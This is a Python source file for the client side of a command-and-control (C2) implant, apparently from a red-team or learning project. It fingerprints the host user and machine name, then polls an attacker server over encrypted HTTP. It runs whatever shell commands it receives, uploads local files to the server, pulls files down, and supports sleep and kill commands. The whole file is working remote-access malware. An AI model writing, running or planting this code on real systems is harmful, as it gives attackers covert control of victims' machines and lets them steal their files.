#!/bin/python3
"""
C2 Client side code
"""
from os import chdir, getenv, uname, getcwd

import platform, socket, time
from subprocess import PIPE, STDOUT, run
from requests import exceptions, get, post, put
from crypt import cipher
from settings import PORT, C2_SERVER, CMD_REQUEST, FILE_REQUEST, RESPONSE_PATH, CWD_RESPONSE, FILE_SEND, RESPONSE_KEY, HEADER, PROXY, HTTPStatusCode


timestamp = str(int(time.time()))
def post_to_server(msg, response_path=RESPONSE_PATH, response_key=RESPONSE_KEY):
    try:
        encrypt_msg = cipher.encrypt(msg.encode())
        post(f"http://{C2_SERVER}:{PORT}{response_path}", data={response_key: encrypt_msg}, headers=HEADER, proxies=PROXY)
    except exceptions.RequestException as e:
        return e

# Check the operating system
if platform.system() == "Windows":
    # Windows environment
    client = getenv("USERNAME", "Unknown_User") + "@" + getenv("COMPUTERNAME", "Unknown_ComputerName") + "_" + timestamp
else:
    # Linux environment
    client = getenv("USER", "Unknown_User") + "@" + uname().nodename + "_" + timestamp
encrypted_client = cipher.encrypt(client.encode()).decode() # encoder

# PROXY = {"https": "proxy.some-site.com:443"}
while True:
    try:
        response = get(f'http://{C2_SERVER}:{PORT}{CMD_REQUEST}{encrypted_client}', headers=HEADER, proxies=PROXY)
        print(response)
        if response.status_code == HTTPStatusCode.NOT_FOUND.value:
            raise exceptions.RequestException
    except exceptions.RequestException as e:
        #print(f"Server down - error: {e}")
        time.sleep(3)
        continue

    cmd = cipher.decrypt(response.content).decode()

    if cmd.startswith("cd "): # cd command
        dir = cmd[3:]
        try:
            chdir(dir)
        except FileNotFoundError:
            post_to_server(f"{dir} was not found.\n")
        except NotADirectoryError:
            post_to_server(f"{dir} is not a directory.\n")
        except PermissionError:
            post_to_server(f"You do not have the permissions to access {dir}.\n")
        except OSError:
            post_to_server(f"There was an OS error on the client.\n")
        else:
            post_to_server(getcwd(), CWD_RESPONSE) # encode of getcwd needed

    elif not cmd.startswith('client'):
        cmd_output = run(cmd, shell=True, stdout=PIPE, stderr=STDOUT)
        post_to_server(cmd_output.stdout.decode())

    elif cmd.startswith('client download'):
        filename = None
        try:
            filepath = cmd.split()[2] # command client download FILENAME
            filename = filepath.replace("\\", "/").rsplit("/", 1)[-1] # clean windows backslash
            encrypted_filepath = cipher.encrypt(filepath.encode()).decode()
            with get(f"http://{C2_SERVER}:{PORT}{FILE_REQUEST}{encrypted_filepath}", stream=True, headers=HEADER, proxies=PROXY) as response:
                    if response.status_code == HTTPStatusCode.OK.value:
                        with open(filename, "wb") as file_handle:
                            # Decrypt the response content and write the file out to disk, then notify us on the server
                            file_handle.write(cipher.decrypt(response.content))
                        post_to_server(f"{filename} is now on {client}.\n")
        except IndexError:
            post_to_server("You must enter the filename to download.")
        except (FileNotFoundError, PermissionError, OSError):
            post_to_server(f"Unable to write {filename} to disk on {client}.\n")

    elif cmd.startswith('client upload'):
        filepath = None
        try:
            filepath = cmd.split()[2] # command client download FILENAME
            filename = filepath.rsplit("/", 1)[-1] 
            encrypted_filename = cipher.encrypt(filename.encode()).decode()
            with open(filepath, "rb") as file_handle:
                encrypted_file = cipher.encrypt(file_handle.read())
                put(f"http://{C2_SERVER}:{PORT}{FILE_SEND}/{encrypted_filename}", data=encrypted_file, stream=True, headers=HEADER, proxies=PROXY)
        except IndexError:
            post_to_server("You must enter the filepath to upload.")
        except (FileNotFoundError, PermissionError, OSError):
            post_to_server(f"Unable to access {filepath} on {client}.\n")

    elif cmd.startswith('client kill'): # kill command
        post_to_server(f"{client} has been killed.\n")
        exit()

    elif cmd.startswith('client sleep '): # sleep command
        try:
            delay = float(cmd.split()[2])
            if delay < 0:
                raise ValueError
        except (IndexError, ValueError):
            post_to_server("You must Enter in a positive nbr for time sleeping in sec.\n")
        else:
            # post_to_server(f"{client} will sleep for {delay} seconds.\n")
            time.sleep(delay)
            post_to_server(f"{client} is now awake.\n")

  
    print(response.status_code)
    #print(f"Response Object: {response.request.headers}\n\tHeader: {response.headers}\n\tReason: {response.reason}\n\tStatus: {response.status_code}")